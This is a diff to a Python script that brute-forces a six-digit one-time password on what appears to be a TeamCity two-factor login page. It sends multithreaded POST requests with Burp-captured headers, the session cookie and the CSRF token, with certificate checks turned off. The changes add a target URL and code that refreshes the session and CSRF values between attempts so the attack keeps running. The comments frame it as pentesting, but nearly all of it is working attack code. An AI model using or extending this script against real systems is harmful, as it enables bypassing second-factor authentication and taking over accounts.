@@ -7,11 +7,12 @@ import time
 from itertools import product
 from concurrent.futures import ThreadPoolExecutor
 
-# this information was captured while performing pentesting
+# the user name and password were obtained by ethical hacking
+# the url, sessionid , and token values by veiwing the webpage, Inspect value
 
 username = ""
 password = ""
-target_url = ""
+target_url = "https://xxx/2fa.html"
 tc_session_id = ""
 tc_csrf_token = ""
 
@@ -25,16 +26,19 @@ warnings.simplefilter("ignore", category=requests.urllib3.exceptions.InsecureReq
 otp_combinations = product(range(10), repeat=6)
 
 # Brute force the OTP using multithreading
-def attempt_login(otp_str):
-    global found_otp, attempts
 
+def attempt_login(otp_str):
+    global found_otp, attempts, tc_session_id, tc_csrf_token
+
+# this requires no modification for user name and password, gets them from above
+    
     data = {
         "username": username,
         "password": password,
         "otp": otp_str
     }
-    
-    # this information was captured using Burp
+
+    # the below values, from line 40 through 57; were obtained using Burp
     
     headers = {
         "Host": "",
@@ -42,7 +46,7 @@ def attempt_login(otp_str):
         "Accept": "application/json",
         "Accept-Language": "en-US,en;q=0.5",
         "Accept-Encoding": "gzip, deflate",
-        "Referer": "",
+        "Referer": "https://xxx.xxx/2fa.html",
         "X-Requested-With": "XMLHttpRequest",
         "X-Teamcity-Client": "Web UI",
         "X-Tc-Csrf-Token": tc_csrf_token,
@@ -56,6 +60,9 @@ def attempt_login(otp_str):
         "Te": "trailers",
         "Cookie": f"TCSESSIONID={tc_session_id}; __test=1"
     }
+
+    # the below code does not require any modification for Burp values
+    
     response = requests.post(target_url, data=data, headers=headers, verify=False)
 
     attempts += 1
@@ -65,6 +72,18 @@ def attempt_login(otp_str):
         found_otp = otp_str
         print(f"Successful login with OTP: {otp_str}")
         return otp_str
+
+    # Check if the session data has changed
+    new_session_id = response.cookies.get("TCSESSIONID")
+    new_token = response.headers.get("X-Tc-Csrf-Token")
+
+    if new_session_id != tc_session_id:
+        tc_session_id = new_session_id
+        print(f"New TCSESSIONID detected: {tc_session_id}")
+
+    if new_token != tc_csrf_token:
+        tc_csrf_token = new_token
+        print(f"New tc-csrf-token detected: {tc_csrf_token}")
 
     return None
 
